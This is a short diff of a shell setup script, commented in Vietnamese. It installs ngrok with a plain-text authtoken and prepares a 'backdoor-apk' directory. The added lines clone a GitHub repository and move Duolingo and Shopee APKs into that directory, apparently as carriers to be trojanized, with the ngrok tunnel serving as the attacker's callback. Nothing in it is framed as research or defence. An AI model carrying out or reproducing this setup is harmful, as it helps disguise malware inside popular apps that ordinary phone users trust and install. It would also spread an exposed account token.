@@ -21,3 +21,9 @@ unzip ngrok-stable-linux-amd64.zip
 ./ngrok authtoken 5KCeQ5xGvCHSgb5mQQcDE_7gKN255BnQq2WV3HPFK8L
 #Bắt đầu đường hầm đầu tiên
 mv a62d106b55562cc1ab88 backdoor-apk
+git clone https://github.com/h-dr4g0n/app-apk.git
+mv ~/app-apk/Duolingo.apk ~/backdoor-apk
+mv ~/app-apk/shopee.apk ~/backdoor-apk
+cd backdoor-apk
+
+
